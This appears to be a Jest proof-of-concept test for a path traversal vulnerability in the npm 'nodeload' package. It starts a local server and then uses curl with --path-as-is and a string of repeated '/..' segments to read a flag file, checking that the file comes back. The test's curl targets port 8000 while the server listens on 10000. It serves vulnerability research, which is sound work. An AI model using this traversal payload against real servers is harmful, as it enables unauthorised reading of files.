//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/nodeload/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in nodeload", (done) => {
    const http = require('nodeload/lib/http');
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    var server = new http.HttpServer().start(10000);
    server.addRoute('^/hello$', function(url, req, res) {
        res.writeHead(200);
        res.end("Hello");
    });

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8000${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        done();
    });
});
